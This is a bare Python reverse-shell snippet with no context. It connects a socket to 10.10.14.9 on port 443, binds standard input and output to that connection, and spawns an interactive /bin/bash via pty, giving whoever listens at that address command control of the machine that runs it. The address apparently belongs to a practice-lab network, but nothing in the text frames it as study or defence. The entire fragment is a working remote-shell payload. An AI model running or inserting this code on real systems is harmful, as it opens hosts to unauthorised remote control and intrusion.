s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.14.9',443))
[os.dup2(s.fileno(),fn) for fn in range(2)]
pty.spawn('/bin/bash')

